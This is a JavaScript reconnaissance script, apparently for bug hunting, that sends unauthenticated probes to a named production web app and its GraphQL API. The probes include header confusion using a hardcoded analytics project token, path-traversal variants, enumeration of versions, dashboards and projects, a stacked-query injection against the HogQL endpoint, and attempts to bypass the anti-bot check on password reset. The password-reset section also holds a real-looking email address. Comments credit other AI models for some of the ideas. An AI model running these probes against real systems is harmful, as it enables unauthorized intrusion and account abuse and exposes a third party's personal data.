// Lot non authentifie : confusion d en-tetes PostHog (Grok) + version PostHog + differential
// PAT sur forgotPassword (Kimi §4) + differentials d erreurs PostHog (projet valide vs invalide)
const APP = "https://bugsecure.senintel.sn";
const API = "https://bugsecure-api.senintel.sn";
const P = "phc_myGuPycfa9UMAmmXHBjPJrqFhzkpvprNv7xof9DZ5Far";
const UA = "BugSecure-OAuth/1 (+client-id-metadata-document)";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function F(u, o = {}) { let e = null; for (let a = 0; a < 3; a++) { try { return await fetch(u, { ...o, signal: AbortSignal.timeout(25000) }); } catch (x) { e = x; await sleep(1500); } } return null; }
async function hit(label, url, opts = {}) {
  const r = await F(url, opts);
  const t = r ? await r.text() : "ERR";
  const ct = r?.headers.get("content-type") || "-";
  const body = t.replace(/\s+/g, " ").slice(0, 130);
  console.log("  " + label.padEnd(54) + "HTTP " + String(r?.status ?? 0).padEnd(4) + (ct.split(";")[0] || "-").padEnd(20) + body);
  await sleep(500);
  return { s: r?.status, t, ct };
}

console.log("=== 1) confusion d en-tetes (PostHog : 'Api <key>' attendu) ===");
const rd = `/ingest/api/projects/${P}/events?limit=1`;
await hit("Authorization: Api <phc project token>", APP + rd, { headers: { Authorization: "Api " + P } });
await hit("Authorization: Bearer <phc project token>", APP + rd, { headers: { Authorization: "Bearer " + P } });
await hit("Authorization: Bearer null", APP + rd, { headers: { Authorization: "Bearer null" } });
await hit("Authorization: Bearer undefined", APP + rd, { headers: { Authorization: "Bearer undefined" } });
await hit("X-PostHog-Token: <phc>", APP + rd, { headers: { "X-PostHog-Token": P } });
await hit("double en-tete Api + X-PostHog-Token", APP + rd, { headers: { Authorization: "Api " + P, "X-PostHog-Token": P } });
await hit("Authorization: Api <phc> + Cookie vide", APP + rd, { headers: { Authorization: "Api " + P, Cookie: "ph_optout=1" } });
await hit("encodage de chemin %2f", APP + `/ingest/api/projects/${encodeURIComponent(P)}%2fevents`, {});
await hit("double slash", APP + `/ingest/api/projects//${P}/events`, {});
await hit("point segment", APP + `/ingest/api/projects/${P}/./events`, {});

console.log("\n=== 2) version / instance_status / signup / dashboard partage ===");
for (const p of ["/ingest/api/instance_status/version", "/ingest/api/instance_status", "/ingest/api/status", "/ingest/api/version", "/ingest/api/signup", "/ingest/api/users/signup", "/ingest/api/config", "/ingest/api/root", "/ingest/api/projects/phc_invalid/events"]) {
  await hit(p, APP + p);
}
await hit("shared_dashboard / token court (8 hex)", APP + "/ingest/shared_dashboard/abcdef12");
await hit("shared_dashboard / token court (12)", APP + "/ingest/shared_dashboard/abcdef123456");
await hit("shared_dashboard / uuid", APP + "/ingest/shared_dashboard/3f2504e0-4f89-11d3-9a0c-0305e82c3301");

console.log("\n=== 3) differential d erreur : projet VALIDE vs INVALIDE (enumeration ?) ===");
for (const p of ["/ingest/api/projects/" + P + "/events", "/ingest/api/projects/phc_00000000000000000000000000000000/events", "/ingest/api/projects/xyz/events", "/ingest/api/projects//events"]) {
  await hit(p, APP + p);
}
await hit("POST HogQL count() sur projet valide", APP + `/ingest/api/projects/${P}/query`, { method: "POST", body: JSON.stringify({ query: { kind: "HogQLQuery", query: "SELECT count() FROM events" } }) });
await hit("POST HogQL injection", APP + `/ingest/api/projects/${P}/query`, { method: "POST", body: JSON.stringify({ query: { kind: "HogQLQuery", query: "SELECT 1; SELECT currentUser()" } }) });

console.log("\n=== 4) decide / flags : abus possibles ===");
await hit("decide avec token+ip", APP + `/ingest/decide?v=3&token=${P}&ip=1`);
await hit("flags avec token", APP + `/ingest/flags?v=2&token=${P}`);

console.log("\n=== 5) forgotPassword : differential du canal anti-bot (PAT) ===");
const fp = { query: `mutation { forgotPassword(email: "williamnex24lechallenge@gmail.com") }` };
await hit("forgotPassword sans en-tete", API + "/graphql", { method: "POST", body: JSON.stringify(fp) });
await hit("forgotPassword + Sec-Private-Token (bidon)", API + "/graphql", { method: "POST", headers: { "Sec-Private-Token-Challenge-Response": "AAAA" }, body: JSON.stringify(fp) });
await hit("forgotPassword + Private-Token (bidon)", API + "/graphql", { method: "POST", headers: { "Private-Token": "AAAA" }, body: JSON.stringify(fp) });
await hit("forgotPassword + X-Captcha (bidon)", API + "/graphql", { method: "POST", headers: { "X-Captcha-Response": "AAAA" }, body: JSON.stringify(fp) });
await hit("forgotPassword + Turnstile (bidon)", API + "/graphql", { method: "POST", headers: { "X-Turnstile-Response": "AAAA" }, body: JSON.stringify(fp) });
